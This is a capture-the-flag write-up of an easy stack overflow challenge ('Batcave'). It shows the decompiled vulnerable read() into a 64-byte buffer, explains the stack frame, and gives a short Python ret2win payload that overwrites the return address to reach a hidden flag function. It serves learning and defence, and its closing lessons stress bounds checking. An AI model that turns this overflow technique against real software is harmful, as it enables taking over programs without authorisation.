# G**e — PWN

> Flag: FLAG{0x***_R3T2W1N_N0_PR0T3CT**N5}

### Details: 

Batcave Gate • Easy ret2win

Simple Stack Overflow (No Protections)

## 1. Analysis

```
file batcave
batcave: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d19c2260ca1f7fef8f0b43b5cab491e526b0a2f4, for GNU/Linux 3.2.0, with debug_info, not stripped
```

I noticed that the flag can be seen in the strings. However, our goal is not to simply paste the flag as quickly as possible; we need to perform the ret2win exploit in order to obtain the flag.

```
strings batcave
/lib64/ld-linux-x86-64.so.2
setvbuf
puts
fflush
system
read
stdout
__libc_start_main
printf
strncmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
__gmon_start__
PTE1
H=H@@
[BATCOMPUTER]: Access Granted. The Batcave doors slide open...
You find the Dark Knight's terminal waiting for you.
FLAG{0x***_R3T2W1N_N0_PR0T3CT**N5}
/bin/sh
Enter the Batcave access code:
N1ghtw1ng_R3turns
Correct code -- but Alfred says that's not how you get in tonight.
Access Denied. The Batcave remains sealed.
=========================================
WAYNE ENTERPRISES SECURITY -- 0x8A7
BATCAVE ACCESS TERMINAL
[LOG] Session ended.
;*3$"
```

Decompiled binary on Ghidra.

**main**
```
int main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("=========================================");
  puts("   WAYNE ENTERPRISES SECURITY -- 0x8A7");
  puts("        BATCAVE ACCESS TERMINAL");
  puts("=========================================");
  check_password();
  puts("[LOG] Session ended.");
  return 0;
}
```

**check_password**
```
void check_password(void)

{
  int iVar1;
  ssize_t sVar2;
  char buffer [64];
  ssize_t n;
  
  printf("Enter the Batcave access code: ");
  fflush(stdout);
  sVar2 = read(0,buffer,0x200);
  if (0 < sVar2) {
    if (sVar2 < 0x40) {
      buffer[sVar2] = '\0';
    }
    iVar1 = strncmp(buffer,"N1ghtw1ng_R3turns",0x11);
    if (iVar1 == 0) {
      puts("Correct code -- but Alfred says that\'s not how you get in tonight.");
    }
    else {
      puts("Access Denied. The Batcave remains sealed.");
    }
  }
  return;
}
```

You may notice this line of the code `iVar1 = strncmp(buffer,"N1ghtw1ng_R3turns",0x11);` its just a decoy flag, but it doesn't give you the flag. Here is the ouput.

```
./batcave
=========================================
WAYNE ENTERPRISES SECURITY -- 0x8A7
BATCAVE ACCESS TERMINAL
=========================================
Enter the Batcave access code: N1ghtw1ng_R3turns
Correct code -- but Alfred says that's not how you get in tonight.
[LOG] Session ended.
```

At first, I thought I could overflow my input with `"AAAA..."` (513 bytes) in this line, `sVar2 = read(0, buffer, 0x200);`, but it doesn't take my input anymore after 512 bytes. I checked the code for a very long time and noticed that the `buffer` only takes **64** bytes, while `sVar2` reads up to **512** bytes. This gave me the idea of creating an exploit where I can manipulate the return address to point to the special function called `open_batcave`.

 

I checked on the **Ghidra** what is the address of the `open_batcave` and this is the line of the ASM where I found the address:

`00401186    55    PUSH    RBP` 

The address of `open_batcave` is **00401186**. Now that I know the address of the `open_batcave` function, I can now explain how I created the Python payload. To better understand how the exploit works, let's first visualize the stack layout and see where the buffer, saved RBP, and return address are located.

## Script & Explanation

This is the ASM code on the `check_password` function:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             void check_password(void)
             void              <VOID>         <RETURN>
             ssize_t           Stack[-0x10]:8 n                                       XREF[4]:     00401219(W), 
                                                                                                   0040121d(R), 
                                                                                                   00401224(R), 
                                                                                                   0040122f(R)  
             char[64]          Stack[-0x58]   buffer                                  XREF[3]:     00401203(*), 
                                                                                                   0040122b(*), 
                                                                                                   00401240(*)  
                             check_password                                  XREF[4]:     Entry Point(*), main:004012db(c), 
                                                                                          0040221c, 004022d8(*)  
        004011d8 55              PUSH       RBP
        004011d9 48 89 e5        MOV        RBP,RSP
        004011dc 48 83 ec 50     SUB        RSP,0x50
        004011e0 48 8d 05        LEA        RAX,[s_Enter_the_Batcave_access_code:_004020b0]  = "Enter the Batcave access code
                 c9 0e 00 00
        004011e7 48 89 c7        MOV        RDI=>s_Enter_the_Batcave_access_code:_004020b0   = "Enter the Batcave access code
```

Before creating the Python payload, I first needed to understand how the stack works. Looking at the main() function, I found the following instruction:

`004012db    CALL    check_password`

When the program executes the **CALL** instruction, it automatically saves the address of the next instruction onto the stack before transferring execution to the `check_password` function. This saved address is called the **return address**, and it tells the program where to continue once the function finishes executing.

```
              Higher Memory Address
                        ▲
                        │
+--------------------------------------+
| Return Address (back to main)        | <-- Pushed automatically by CALL
+--------------------------------------+
                        │
                        ▼
                Lower Memory Address
```

After entering check_password(), the function executes:

```
push rbp
mov rbp, rsp
sub rsp, 0x50
```

which creates the following stack frame:

```
Stack Frame of check_password()

                Higher Memory Address
                        ▲
                        │
+--------------------------------------+
| Return Address (back to main)        | <-- [RBP + 0x8]
+--------------------------------------+
| Saved RBP                            | <-- [RBP]
+--------------------------------------+
|                                      |
|                                      |
| buffer (80-byte stack allocation)    | <-- [RBP - 0x50]
|                                      |
|                                      |
+--------------------------------------+
                        │
                        ▼
                Lower Memory Address
```

From the stack frame above, the buffer starts at `RBP - 0x50`, which means the compiler allocated **80** bytes for it. Since the saved RBP occupies another **8** bytes, the return address begins **88** bytes from the start of the buffer. Therefore, the first **88** bytes of the payload are used to reach the return address, and the following **8** bytes replace it with the address of open_batcave().

**The exploit script:**

```
cat exploit.py
import sys;

sys.stdout.buffer.write(b"A"*88 + b"\x86\x11\x40\x00\x00\x00\x00\x00")
```

Why isn't it 0x401186? Since x86-64 uses little-endian format, the address 0x401186 is stored in memory as \x86\x11\x40\x00\x00\x00\x00\x00.

The `sys.stdout.buffer.write()` function outputs raw bytes instead of text. This allows me to send the exact payload required by the exploit, consisting of 88 padding bytes followed by the address of `open_batcave`.

When the vulnerable read() writes more than the buffer can hold, the input continues upward through memory: 

```
Buffer Overflow

                Higher Memory Address
                        ▲
                        │
+--------------------------------------+
| Return Address                       | <-- Overwritten last
+--------------------------------------+
| Saved RBP                            | <-- Overwritten second
+--------------------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+--------------------------------------+
                        │
                        ▼
                Lower Memory Address
```

Finally, after using exploit payload, the stack becomes:

```
After the Exploit

                Higher Memory Address
                        ▲
                        │
+--------------------------------------+
| 0x401186 (open_batcave)              | <-- New Return Address
+--------------------------------------+
| AAAAAAAA                             | <-- Saved RBP
+--------------------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+--------------------------------------+
                        │
                        ▼
                Lower Memory Address
```

When check_password() reaches:

```
leave
ret
```

The ret instruction pops the new return address (0x401186) from the stack and transfers execution to `open_batcave` instead of returning to main().

```
$python3 exploit.py | ./batcave
=========================================
WAYNE ENTERPRISES SECURITY -- 0x8A7
BATCAVE ACCESS TERMINAL
=========================================
Enter the Batcave access code: Access Denied. The Batcave remains sealed.

[BATCOMPUTER]: Access Granted. The Batcave doors slide open...
You find the Dark Knight's terminal waiting for you.
FLAG{0x***_R3T2W1N_N0_PR0T3CT**N5}
Segmentation fault (core dumped)
```

PS:
The segmentation fault is expected. After `open_batcave` finishes executing, the program attempts to return using a corrupted stack, causing it to crash. Since the flag has already been printed, the exploit is considered successful.

## 3. Lessons 

1. Stack buffer overflow is a new concept that I learned while doing pwn challenges. Getting hands-on experience with it helped me understand how attackers can manipulate the return address to redirect the program's execution.

2. Whenever a program accepts input into a buffer, it should always perform proper bounds checking. Without these protections, attackers can exploit the vulnerability to overwrite important data on the stack and potentially take control of the program's execution.
